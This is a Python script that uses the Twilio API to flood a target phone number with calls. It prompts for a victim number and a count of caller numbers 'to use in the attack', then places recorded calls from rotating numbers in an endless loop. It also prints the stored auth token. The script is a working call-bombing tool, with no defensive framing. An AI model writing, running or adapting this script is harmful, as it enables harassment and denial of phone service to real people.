from twilio.rest import Client
import time
import sys

# Global Settings
class Settings:

    lines       = None
    account_sid = None
    auth_token  = None
    voice_url   = None
    numbers     = None

    def __init__(self, lines, account_sid, auth_token, voice_url, numbers):
        self.lines = lines
        self.account_sid = account_sid
        self.auth_token = auth_token
        self.voice_url = voice_url  
        self.numbers = numbers

def setup_twilio_client():
    settingsFile = open("settings.txt", "r")
    if settingsFile.mode == "r":
        # Read & Parse settings from input file
        lines = settingsFile.readlines()
        account_sid = lines[0].split("'")[1]
        auth_token = lines[1].split("'")[1]
        voice_url = lines[2].split("'")[1]
        numbers = [line.strip() for line in lines[3].split("=")[1].split(",")]

        # Store data in our settings object
        settings = Settings(lines, account_sid, auth_token, voice_url, numbers)

    return settings

def display_settings_object(settings):
    print("Account_sid: " + settings.account_sid)
    print("Auth_token: " + settings.auth_token)
    print("Voice_url: " + settings.voice_url)
    print("Numbers: ", end='') 
    print(settings.numbers)

def get_target_number():
    target_number = input("Enter a target number (ex: 7141234567): ")
    if len(target_number) is not 10 or not target_number.isdigit():
        print("Invalid format. Exiting...")
        sys.exit()
    target_number = '+1' + target_number # Put into correct format
    return target_number

def get_numbers_to_use(settings):
    numbers_to_use = int(input("Enter the number of phone numbers to use in the attack: "))
    if numbers_to_use > len(settings.numbers):
        numbers_to_use = len(settings.numbers)
        print("Input numbers too large. Setting to the max available value of " + str(numbers_to_use))
    if numbers_to_use <= 0:
        print("Input too small. Exiting...")
        sys.exit()
    return numbers_to_use   

def make_call(client, voice_url, from_number, target_number):
    call = client.calls.create(
                        record = True,
                        url= voice_url,
                        to= target_number,
                        from_= from_number
                    )

def main(argv):

    settings = setup_twilio_client()
    display_settings_object(settings)
    target_number = get_target_number()
    numbers_to_use = get_numbers_to_use(settings)
    
    client = Client(settings.account_sid, settings.auth_token)

    try:
        while True:
            print("Initiating batch call...")
            for i in range(0, numbers_to_use):
                print("Calling " + target_number + " from " + settings.numbers[i] + "...")
                make_call(client, settings.voice_url, settings.numbers[i], target_number)
                time.sleep(5)
            print("Pausing for next batch...")
            print()
            time.sleep(10)

    except KeyboardInterrupt:
        print("Exiting...")
        sys.exit()

    pass

if __name__ == "__main__":
    main(sys.argv)
